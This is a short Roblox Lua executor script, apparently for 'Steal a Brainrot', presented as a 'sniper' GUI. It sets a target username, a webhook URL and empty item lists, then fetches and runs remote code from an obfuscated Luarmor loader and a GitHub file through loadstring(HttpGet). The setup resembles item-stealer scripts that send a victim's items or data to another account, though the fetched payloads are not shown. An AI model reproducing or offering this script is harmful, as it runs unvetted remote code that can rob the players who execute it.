-- Mode: CODESNIPER
getgenv().TARGET_USERNAME = "kiwi14708"
getgenv().WEBHOOK_URL = "https"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua"))()
end)